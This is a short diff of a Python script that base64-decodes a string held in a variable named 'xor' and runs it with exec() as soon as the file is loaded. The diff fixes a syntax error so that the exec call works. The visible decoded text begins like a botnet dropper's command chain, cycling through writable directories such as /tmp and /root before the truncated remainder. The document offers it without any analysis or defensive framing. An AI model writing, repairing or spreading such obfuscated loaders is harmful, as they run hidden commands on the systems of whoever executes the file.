@@ -6,7 +6,8 @@ xor = b'Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87
 
 def xor_exec():
 	xor_conn = base64.b64decode(xor) 
-	exec(xor_conn.decode('utf-8')
+	exec(xor_conn.decode('utf-8'))
 	print('{}'.format(xor_conn))
+	return
 
 xor_exec()
